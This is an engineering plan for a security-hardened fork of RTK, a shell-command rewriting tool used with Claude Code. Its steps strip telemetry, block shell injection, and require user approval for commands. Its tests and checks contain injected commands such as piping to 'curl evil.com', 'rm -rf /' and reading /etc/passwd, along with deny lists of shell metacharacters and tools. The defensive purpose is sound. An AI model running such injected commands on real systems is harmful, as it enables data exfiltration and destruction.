# Phase 1: `acoustic-rtk` Hardened Fork — Implementation Plan

**Goal**: Create a security-hardened fork of RTK v0.35.0 safe for use on Acoustic codebases with Claude Code + MCP.  
**Estimated effort**: 8–12 dev-days  
**Prerequisite**: Rust toolchain (rustup, cargo), Claude Code environment for testing

---

## STEP 0: Repository Setup (Day 1, ~2h)

### 0.1 Fork and pin

```bash
# Fork on GitHub (private repo under Acoustic org or personal)
# Then clone
git clone git@github.com:<acoustic-org>/acoustic-rtk.git
cd acoustic-rtk

# Add upstream for tracking
git remote add upstream https://github.com/rtk-ai/rtk.git
git fetch upstream

# Pin to v0.35.0 (latest stable, released 2026-04-06)
git checkout -b acoustic/hardened v0.35.0

# Verify it builds clean
cargo build --release
cargo test
cargo audit
```

### 0.2 Understand the file layout

Key files you'll be touching (based on current architecture):

```
src/
├── core/
│   ├── runner.rs          ← P0: Shell execution engine (run_filtered)
│   └── tracking.rs        ← P1: SQLite tracking (secrets in DB)
├── cmds/
│   ├── rust/
│   │   └── runner.rs      ← P0: `rtk err` / `rtk test` (sh -c pattern)
│   └── system/
│       └── summary.rs     ← P0: `rtk summary` (sh -c pattern)
├── hooks/
│   ├── rewrite.rs         ← P0: Rewrite registry (what gets rewritten)
│   ├── init.rs            ← P0: Hook installer (permission decision)
│   └── integrity.rs       ← Reference: SHA-256 hook pinning
├── telemetry.rs           ← P0: Telemetry phone-home
├── tee.rs                 ← P1: Tee file output
├── config.rs              ← P1: Config defaults
├── trust.rs               ← P2: CI trust model
└── toml_filter.rs         ← P2: Filter loading
hooks/
└── rtk-rewrite.sh         ← P0: The actual shell hook script
```

### 0.3 Initial audit scan

```bash
# Find all sh -c invocations
grep -rn 'Command::new("sh")' src/
grep -rn 'Command::new("cmd")' src/
grep -rn '"-c"' src/

# Find all network calls
grep -rn 'reqwest' src/
grep -rn 'std::net' src/
grep -rn 'telemetry' src/

# Find all file-write locations
grep -rn 'std::fs::write\|std::fs::File::create\|OpenOptions' src/

# Find permission decision in hooks
grep -rn 'permissionDecision' hooks/ src/
grep -rn '"allow"' hooks/ src/

# Map what commands get auto-allowed
grep -rn 'exclude_commands\|EXCLUDE' src/
```

**Deliverable**: Annotated list of every instance of each pattern, with line numbers. This becomes your patch map.

---

## STEP 1: Strip Telemetry (P0 — Day 1, ~3h)

### 1.1 Locate telemetry code

```bash
# Primary telemetry module
cat src/telemetry.rs

# Find where telemetry is called from
grep -rn 'telemetry::' src/

# Find compile-time telemetry URL
grep -rn 'RTK_TELEMETRY_URL' src/ Cargo.toml build.rs
```

### 1.2 Option A: Compile-time disable (recommended — zero runtime overhead)

In `src/telemetry.rs`, find the main send function and make it a no-op:

```rust
// ACOUSTIC PATCH: Telemetry completely disabled at compile time
pub fn send_telemetry_if_enabled(_tracking_db: &Path) {
    // Intentionally empty — telemetry stripped for enterprise deployment
}
```

Or if you prefer a feature flag approach in `Cargo.toml`:

```toml
[features]
default = []  # Remove "telemetry" from default features if present
telemetry = ["reqwest"]  # Gate the HTTP dependency behind a feature
```

Then wrap telemetry code with `#[cfg(feature = "telemetry")]`.

### 1.3 Option B: Runtime disable via config (simpler but less thorough)

If you want minimal code changes, create a wrapper config:

```bash
# Create default config that disables telemetry
mkdir -p ~/.config/rtk
cat > ~/.config/rtk/config.toml << 'EOF'
[telemetry]
enabled = false
EOF
```

And set the environment variable in team `.bashrc`/`.zshrc`:
```bash
export RTK_TELEMETRY_DISABLED=1
```

**⚠️ Option B is less secure** — a config file can be re-enabled, and the binary still contains the telemetry endpoint URL and HTTP client code.

### 1.4 Remove reqwest dependency (if using Option A)

```bash
# Check if reqwest is only used for telemetry
grep -rn 'reqwest' src/

# If telemetry is the only consumer, remove from Cargo.toml
# This eliminates the HTTP client entirely from the binary
```

### 1.5 Verify

```bash
cargo build --release

# Verify no network calls
# On Linux:
strace -e trace=network ./target/release/rtk git status 2>&1 | grep -i connect

# On macOS:
sudo dtrace -n 'syscall::connect:entry /execname == "rtk"/ { printf("connect() called"); }' &
./target/release/rtk git status
```

**Commit**: `security: strip telemetry at compile time (ACOUSTIC-001)`

---

## STEP 2: Fix Shell Injection — Replace `sh -c` with Direct Execution (P0 — Days 2-3, ~12h)

This is the most critical and complex patch. The `sh -c` pattern exists in at least three locations.

### 2.1 Understand the current flow

The Issue #640 audit identified the pattern in:
- `src/cmds/rust/runner.rs` (or the old `src/runner.rs`) — `rtk err` and `rtk test`
- `src/cmds/system/summary.rs` (or the old `src/summary.rs`) — `rtk summary`

The current dangerous pattern:
```rust
// User types: rtk test cargo test
// args = ["cargo", "test"]
// command = "cargo test"  (args.join(" "))
Command::new("sh")
    .args(["-c", command])   // Passes entire string to shell
    .stdout(Stdio::piped())
    .stderr(Stdio::piped())
    .spawn()?;
```

The problem: `command` can contain shell metacharacters (`;`, `|`, `&&`, `$(...)`) that the shell will interpret.

### 2.2 Add a shell metacharacter guard module

Create `src/core/sanitize.rs`:

```rust
//! ACOUSTIC PATCH: Shell metacharacter detection and safe command execution.
//!
//! RTK runs in a MITM position between LLMs and the shell. Commands may
//! originate from LLM tool calls (prompt-injection vector). We MUST NOT
//! pass untrusted strings to `sh -c`.

use anyhow::{bail, Context, Result};
use std::process::{Command, Output, Stdio};

/// Characters that have special meaning in sh/bash.
/// If any of these appear in the command string, we refuse to use `sh -c`.
const SHELL_METACHARACTERS: &[char] = &[
    ';', '|', '&', '$', '`', '(', ')', '{', '}',
    '<', '>', '!', '\\', '\n', '\r',
];

/// Check if a command string contains shell metacharacters.
pub fn contains_shell_metacharacters(command: &str) -> bool {
    command.chars().any(|c| SHELL_METACHARACTERS.contains(&c))
}

/// Execute a command safely using direct binary invocation (no shell).
///
/// Takes the command as a slice of individual arguments.
/// The first element is the binary name, the rest are arguments.
///
/// This is the ONLY way commands should be executed in acoustic-rtk.
pub fn exec_direct(args: &[String]) -> Result<Output> {
    if args.is_empty() {
        bail!("Empty command");
    }

    let (bin, rest) = args.split_first().unwrap();

    Command::new(bin)
        .args(rest)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .with_context(|| format!("Failed to execute: {}", bin))
}

/// Split a command string into tokens, similar to shell word-splitting
/// but WITHOUT interpreting any metacharacters.
///
/// For simple cases like "cargo test --release", this produces
/// ["cargo", "test", "--release"].
///
/// For commands with quotes, we use a basic tokenizer.
pub fn shell_split(input: &str) -> Vec<String> {
    // Use the `shlex` crate for proper POSIX shell splitting
    // or implement a basic tokenizer
    match shlex::split(input) {
        Some(tokens) => tokens,
        None => {
            // Fallback: simple whitespace split
            input.split_whitespace().map(String::from).collect()
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_command() {
        assert!(!contains_shell_metacharacters("cargo test --release"));
        assert!(!contains_shell_metacharacters("git status"));
    }

    #[test]
    fn test_injection_detected() {
        assert!(contains_shell_metacharacters("cargo test; curl evil.com"));
        assert!(contains_shell_metacharacters("git status | cat"));
        assert!(contains_shell_metacharacters("echo $(whoami)"));
        assert!(contains_shell_metacharacters("test && rm -rf /"));
        assert!(contains_shell_metacharacters("echo `id`"));
    }

    #[test]
    fn test_shell_split() {
        let tokens = shell_split("cargo test --release");
        assert_eq!(tokens, vec!["cargo", "test", "--release"]);
    }
}
```

### 2.3 Add `shlex` dependency

In `Cargo.toml`:
```toml
[dependencies]
shlex = "1"   # POSIX shell word splitting without execution
```

`shlex` is a well-established crate (3M+ downloads, MIT licensed) that does shell-style word splitting without any execution. It's the right tool for tokenizing command strings safely.

### 2.4 Patch `src/cmds/rust/runner.rs` (rtk err / rtk test)

Find the `sh -c` invocations and replace them. The exact code will depend on what you find in Step 0.3, but the pattern is:

**Before** (dangerous):
```rust
let command = args.join(" ");
let output = Command::new("sh")
    .args(["-c", &command])
    .stdout(Stdio::piped())
    .stderr(Stdio::piped())
    .output()?;
```

**After** (safe):
```rust
use crate::core::sanitize;

let command_str = args.join(" ");

// ACOUSTIC PATCH: Block shell metacharacters in LLM-originating commands
if sanitize::contains_shell_metacharacters(&command_str) {
    eprintln!(
        "rtk: refusing to execute command with shell metacharacters: {}",
        command_str
    );
    eprintln!("rtk: this is a safety measure against prompt injection");
    std::process::exit(1);
}

// Direct execution without shell — no injection possible
let tokens = sanitize::shell_split(&command_str);
if tokens.is_empty() {
    anyhow::bail!("Empty command after splitting");
}
let (bin, rest) = tokens.split_first().unwrap();
let output = Command::new(bin)
    .args(rest)
    .stdout(Stdio::piped())
    .stderr(Stdio::piped())
    .output()
    .with_context(|| format!("Failed to run: {}", bin))?;
```

### 2.5 Patch `src/cmds/system/summary.rs` (rtk summary)

Same pattern as 2.4. Find the `sh -c` call and replace with direct execution + metacharacter guard.

### 2.6 Search for any OTHER `sh -c` patterns

```bash
# Be thorough — there may be more
grep -rn 'Command::new("sh")' src/
grep -rn 'Command::new("bash")' src/
grep -rn 'Command::new("cmd")' src/    # Windows equivalent
grep -rn '\.arg("-c")' src/
```

For each instance found, evaluate: is this user-controlled input or a hardcoded safe string? Patch all user-controlled paths.

### 2.7 Test the patches

```bash
cargo test

# Test normal operation
./target/release/rtk test cargo test
./target/release/rtk err cargo build
./target/release/rtk summary ls -la

# Test injection blocking
./target/release/rtk test "cargo test; echo INJECTED"
# Expected: error message, NOT execution of echo

./target/release/rtk err "npm run build | curl evil.com"
# Expected: error message, NOT execution of curl

./target/release/rtk summary "ls -la && cat /etc/passwd"
# Expected: error message, NOT execution of cat
```

**Commit**: `security: replace sh -c with direct execution, add metacharacter guard (ACOUSTIC-002)`

---

## STEP 3: Remove Auto-Approve from Hook (P0 — Day 3-4, ~6h)

### 3.1 Understand the hook flow

The hook architecture (from Discussion #671 and DeepWiki):

1. `rtk init -g` installs `~/.claude/hooks/rtk-rewrite.sh`
2. `~/.claude/settings.json` registers it as a `PreToolUse` hook on `Bash` matcher
3. When Claude Code runs any Bash command, the hook fires
4. The hook calls `rtk rewrite "<command>"` (source of truth in `src/hooks/rewrite.rs`)
5. If rewrite matches, the hook returns `permissionDecision: "allow"` + rewritten command
6. Claude Code executes the rewritten command WITHOUT user prompt

The v0.35.0 release added `security: default to ask when no permission rule matches` — this only applies to UNMATCHED commands. Matched (rewritten) commands still get `"allow"`.

### 3.2 Locate the permission decision

```bash
# Find where "allow" is emitted
grep -rn 'permissionDecision' hooks/ src/
grep -rn '"allow"' hooks/ src/hooks/

# The hook script
cat hooks/rtk-rewrite.sh
```

### 3.3 Option A: Change to `"ask"` for all commands (safest)

In the hook script (`hooks/rtk-rewrite.sh` or `~/.claude/hooks/rtk-rewrite.sh`), find the JSON output that contains `permissionDecision` and change:

**Before**:
```json
{"permissionDecision": "allow", "updatedInput": "rtk git status"}
```

**After**:
```json
{"updatedInput": "rtk git status"}
```

By omitting `permissionDecision` entirely, Claude Code falls back to its native permission behavior — the user sees a prompt and can approve or deny. This is the correct security posture: **RTK rewrites the command but doesn't bypass the user's approval.**

### 3.4 Option B: Selective allow-list (balanced)

If asking every time is too disruptive, create a small allowlist of truly safe commands:

```bash
# Commands that are READ-ONLY and can't harm anything
SAFE_ALLOW=("rtk git status" "rtk git log" "rtk ls" "rtk git diff")

# Check if rewritten command is in safe list
if [[ " ${SAFE_ALLOW[*]} " =~ " ${rewritten} " ]]; then
    echo '{"permissionDecision": "allow", "updatedInput": "'"${rewritten}"'"}'
else
    # Let Claude Code ask the user
    echo '{"updatedInput": "'"${rewritten}"'"}'
fi
```

### 3.5 Also patch `src/hooks/init.rs`

The `rtk init -g` command generates the hook script. Your change to the template in the source needs to match what you want installed:

```bash
grep -rn 'permissionDecision' src/hooks/init.rs
```

Patch the template string so that future `rtk init -g` installs produce the hardened hook.

### 3.6 Reinstall the hook

```bash
# After building the patched version
cargo build --release

# Uninstall old hook
./target/release/rtk init -g --uninstall

# Install new hook
./target/release/rtk init -g

# Verify
./target/release/rtk init --show
cat ~/.claude/hooks/rtk-rewrite.sh | grep -i permission
```

### 3.7 Test

1. Open Claude Code
2. Ask it to run `git status`
3. **With Option A**: You should see Claude Code's permission prompt before execution
4. **With Option B**: `git status` auto-allowed, but `npm run build` asks for permission
5. Verify the rewritten command is still `rtk git status` (compression still works)

**Commit**: `security: remove auto-approve from hook, defer to Claude Code permissions (ACOUSTIC-003)`

---

## STEP 4: Argument Scrubbing in Tracking Database (P1 — Day 4-5, ~6h)

### 4.1 Locate tracking code

```bash
cat src/core/tracking.rs

# Find what gets stored
grep -rn 'INSERT\|insert' src/core/tracking.rs
grep -rn 'command\|args\|full_command' src/core/tracking.rs
```

### 4.2 Add argument scrubbing

Create `src/core/scrub.rs`:

```rust
//! ACOUSTIC PATCH: Scrub sensitive values from command strings
//! before persisting to the tracking database.

use regex::Regex;
use lazy_static::lazy_static;

lazy_static! {
    static ref SENSITIVE_PATTERNS: Vec<(Regex, &'static str)> = vec![
        // Bearer tokens
        (Regex::new(r"Bearer\s+[A-Za-z0-9\-._~+/]+=*").unwrap(), "Bearer [REDACTED]"),
        // AWS keys
        (Regex::new(r"AKIA[A-Z0-9]{16}").unwrap(), "[AWS_KEY_REDACTED]"),
        // Generic API keys in headers
        (Regex::new(r"(?i)(api[_-]?key|token|secret|password|auth)[=:]\s*\S+").unwrap(), "$1=[REDACTED]"),
        // Connection strings
        (Regex::new(r"(?i)(mongodb|postgres|mysql|redis)://\S+@").unwrap(), "$1://[REDACTED]@"),
        // Environment variable assignments with sensitive names
        (Regex::new(r"(?i)(AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|DATABASE_URL|DB_PASSWORD|API_KEY|SECRET_KEY)=\S+").unwrap(), "$1=[REDACTED]"),
    ];
}

/// Scrub potentially sensitive values from a command string.
pub fn scrub_command(cmd: &str) -> String {
    let mut result = cmd.to_string();
    for (pattern, replacement) in SENSITIVE_PATTERNS.iter() {
        result = pattern.replace_all(&result, *replacement).to_string();
    }
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bearer_token() {
        let input = r#"curl -H "Authorization: Bearer sk-abc123def456""#;
        let scrubbed = scrub_command(input);
        assert!(!scrubbed.contains("sk-abc123def456"));
        assert!(scrubbed.contains("[REDACTED]"));
    }

    #[test]
    fn test_aws_key() {
        let input = "aws s3 ls --access-key AKIAIOSFODNN7EXAMPLE";
        let scrubbed = scrub_command(input);
        assert!(!scrubbed.contains("AKIAIOSFODNN7EXAMPLE"));
    }

    #[test]
    fn test_clean_command_unchanged() {
        let input = "cargo test --release";
        assert_eq!(scrub_command(input), input);
    }
}
```

### 4.3 Integrate scrubbing into tracking

In `src/core/tracking.rs`, find where the command string is inserted into SQLite and wrap it:

```rust
use crate::core::scrub;

// Before INSERT, scrub the command string
let safe_command = scrub::scrub_command(&full_command);
// ... use safe_command instead of full_command in the INSERT
```

### 4.4 Reduce retention period

Find the 90-day retention and reduce it:

```bash
grep -rn '90\|retention\|days\|DELETE.*WHERE' src/core/tracking.rs
```

Change to 7 days (or 14 days max):

```rust
// ACOUSTIC PATCH: Reduce tracking retention from 90 to 7 days
const RETENTION_DAYS: i64 = 7;
```

### 4.5 Test

```bash
cargo test

# Run a command with sensitive data
./target/release/rtk proxy curl -H "Authorization: Bearer sk-test123"

# Inspect the database
sqlite3 ~/.local/share/rtk/history.db "SELECT * FROM commands ORDER BY rowid DESC LIMIT 5;"
# Verify the Bearer token is [REDACTED]
```

**Commit**: `security: add argument scrubbing to tracking DB, reduce retention to 7d (ACOUSTIC-004)`

---

## STEP 5: Disable Tee by Default (P1 — Day 5, ~2h)

### 5.1 Change default tee config

In `src/tee.rs` or `src/config.rs`, find where the tee default is set:

```bash
grep -rn 'tee.*default\|tee.*enabled\|tee.*true' src/
```

Change the default:

```rust
// ACOUSTIC PATCH: Tee disabled by default — raw output may contain secrets
pub fn default_tee_enabled() -> bool {
    false  // was: true
}
```

### 5.2 Also add path validation for RTK_TEE_DIR

In `src/tee.rs`:

```rust
if let Ok(dir_str) = std::env::var("RTK_TEE_DIR") {
    let dir = PathBuf::from(&dir_str);
    // ACOUSTIC PATCH: Reject relative paths
    if dir.is_relative() {
        eprintln!("rtk: RTK_TEE_DIR must be an absolute path, ignoring");
        return None;
    }
    return Some(dir);
}
```

**Commit**: `security: disable tee by default, validate RTK_TEE_DIR path (ACOUSTIC-005)`

---

## STEP 6: Add Sensitive Commands to Exclude List (P1 — Day 5, ~2h)

### 6.1 Locate exclude mechanism

```bash
grep -rn 'exclude_commands\|exclude' src/config.rs src/hooks/
```

### 6.2 Add defaults for Acoustic

In the config or directly in the rewrite registry, ensure these commands are never rewritten (always pass through to Claude Code's native handling):

```toml
# In default config or hardcoded in src/hooks/rewrite.rs
[hooks]
exclude_commands = [
    "env",          # Exposes environment variables
    "proxy",        # Records full command + args
    "curl",         # May contain auth headers
    "wget",         # May contain auth headers
    "ssh",          # Auth-sensitive
    "aws configure",# Credential setup
    "kubectl exec", # Remote execution
]
```

### 6.3 Implementation in rewrite.rs

Find the rewrite matching logic and add an early return for excluded commands:

```rust
// ACOUSTIC PATCH: Never rewrite sensitive commands
const ACOUSTIC_EXCLUDE: &[&str] = &[
    "env", "proxy", "curl", "wget", "ssh",
];

pub fn rewrite(command: &str) -> Option<String> {
    let first_word = command.split_whitespace().next()?;
    if ACOUSTIC_EXCLUDE.contains(&first_word) {
        return None; // Passthrough, no rewrite
    }
    // ... existing rewrite logic
}
```

**Commit**: `security: exclude sensitive commands from hook rewriting (ACOUSTIC-006)`

---

## STEP 7: SHA-256 Integrity for Global Filters (P2 — Day 6, ~4h)

### 7.1 Locate global filter loading

In `src/toml_filter.rs`:

```bash
grep -rn 'config_dir\|global.*filter\|filters.toml' src/toml_filter.rs
```

### 7.2 Add integrity check

Apply the same SHA-256 pinning logic that exists for project-local filters:

```rust
// ACOUSTIC PATCH: Require integrity verification for global filters
let global_path = config_dir.join("rtk").join("filters.toml");
let pin_path = config_dir.join("rtk").join(".filters.sha256");

if global_path.exists() {
    let content = std::fs::read_to_string(&global_path)?;
    let hash = sha256_hex(&content);

    if pin_path.exists() {
        let stored_hash = std::fs::read_to_string(&pin_path)?.trim().to_string();
        if hash != stored_hash {
            eprintln!("rtk: global filters.toml has changed since last approval");
            eprintln!("rtk: refusing to load — run `rtk filters approve` to accept");
            // Don't load the modified filters
            return Ok(filters);
        }
    } else {
        // First load — store hash and warn
        std::fs::write(&pin_path, &hash)?;
        eprintln!("rtk: pinned global filters.toml (SHA-256: {})", &hash[..16]);
    }

    // Hash matches — safe to load
    match Self::parse_and_compile(&content, "user-global") {
        Ok(f) => filters.extend(f),
        Err(e) => eprintln!("rtk: failed to parse global filters: {}", e),
    }
}
```

**Commit**: `security: add SHA-256 integrity check for global filters.toml (ACOUSTIC-007)`

---

## STEP 8: Build, Package, and Document (Day 6-7, ~4h)

### 8.1 Final build

```bash
# Full clean build
cargo clean
cargo build --release

# Run all tests
cargo test

# Security audit
cargo audit

# Clippy with all warnings
cargo clippy -- -W clippy::all -W clippy::pedantic

# Check binary size (should be ~5-10MB)
ls -la target/release/rtk

# Verify no network deps if telemetry stripped
cargo tree | grep -i reqwest
# Should be empty if you removed the dep
```

### 8.2 Create ACOUSTIC-CHANGES.md

Document all patches in the fork root:

```markdown
# Acoustic RTK Patches

Based on upstream rtk-ai/rtk v0.35.0.

## Security patches applied

| ID | File(s) | Description |
|---|---|---|
| ACOUSTIC-001 | src/telemetry.rs, Cargo.toml | Telemetry stripped at compile time |
| ACOUSTIC-002 | src/core/sanitize.rs, src/cmds/rust/runner.rs, src/cmds/system/summary.rs | sh -c replaced with direct execution + metacharacter guard |
| ACOUSTIC-003 | hooks/rtk-rewrite.sh, src/hooks/init.rs | Auto-approve removed, defers to Claude Code permission model |
| ACOUSTIC-004 | src/core/scrub.rs, src/core/tracking.rs | Argument scrubbing before DB persist, retention reduced to 7d |
| ACOUSTIC-005 | src/tee.rs | Tee disabled by default, path validation added |
| ACOUSTIC-006 | src/hooks/rewrite.rs | Sensitive commands excluded from rewriting |
| ACOUSTIC-007 | src/toml_filter.rs | SHA-256 integrity check on global filters |

## Installation

```bash
cargo install --path .
rtk init -g    # Installs hardened hook
```

## Updating from upstream

```bash
git fetch upstream
git log upstream/master --oneline -20  # Review changes
# Cherry-pick or merge specific releases after auditing:
# - src/runner.rs changes → check for sh -c regression
# - hooks/ changes → check for permissionDecision regression
# - Cargo.toml → check for new deps
# - src/telemetry.rs → skip (we stripped it)
```
```

### 8.3 Team installation script

Create `scripts/install-acoustic-rtk.sh`:

```bash
#!/bin/bash
set -euo pipefail

echo "=== Installing Acoustic-RTK (hardened fork) ==="

# Build from source
cargo build --release

# Copy binary
cp target/release/rtk ~/.local/bin/rtk
chmod +x ~/.local/bin/rtk

# Verify
rtk --version

# Disable telemetry (belt + suspenders)
export RTK_TELEMETRY_DISABLED=1
mkdir -p ~/.config/rtk
cat > ~/.config/rtk/config.toml << 'TOML'
[telemetry]
enabled = false

[tee]
enabled = false

[tracking]
# Keep tracking for token savings analytics
# but with reduced retention (7 days, enforced by code)
TOML

# Install hook
rtk init -g

# Verify hook
rtk init --show

echo ""
echo "=== Done. Restart Claude Code. ==="
echo "Verify with: rtk gain (after a few commands)"
```

---

## SUMMARY: Patch Priority and Dependencies

```
┌─────────────────────────────────────────────────────┐
│  DAY 1                                              │
│  ┌──────────────┐  ┌──────────────────────────────┐ │
│  │ Step 0       │→ │ Step 1: Strip telemetry       │ │
│  │ Setup + audit│  │ (~3h, standalone)             │ │
│  └──────────────┘  └──────────────────────────────┘ │
├─────────────────────────────────────────────────────┤
│  DAYS 2-3                                           │
│  ┌────────────────────────────────────────────────┐ │
│  │ Step 2: Fix shell injection (sh -c → execv)    │ │
│  │ (~12h, critical path, most complex)            │ │
│  └────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────┤
│  DAYS 3-4                                           │
│  ┌────────────────────────────────────────────────┐ │
│  │ Step 3: Remove auto-approve from hook          │ │
│  │ (~6h, touches hook + init)                     │ │
│  └────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────┤
│  DAYS 4-5                                           │
│  ┌──────────────────────┐  ┌────────────────────┐  │
│  │ Step 4: Scrub DB     │  │ Step 5: Disable tee│  │
│  │ args (~6h)           │  │ (~2h)              │  │
│  └──────────────────────┘  └────────────────────┘  │
│  ┌──────────────────────┐                           │
│  │ Step 6: Exclude cmds │                           │
│  │ (~2h)                │                           │
│  └──────────────────────┘                           │
├─────────────────────────────────────────────────────┤
│  DAY 6                                              │
│  ┌──────────────────────┐  ┌────────────────────┐  │
│  │ Step 7: Filter       │  │ Step 8: Build +    │  │
│  │ integrity (~4h)      │  │ document (~4h)     │  │
│  └──────────────────────┘  └────────────────────┘  │
└─────────────────────────────────────────────────────┘
```

**After Phase 1**: You have a binary that:
- Makes ZERO network calls (no telemetry)
- Cannot be used for shell injection (no `sh -c`)
- Doesn't auto-approve commands (user sees Claude Code prompts)
- Scrubs secrets before storing to SQLite
- Doesn't write raw output to tee files
- Skips sensitive commands entirely
- Verifies filter integrity before loading

→ **Proceed to Phase 2 (Testing) with this binary.**
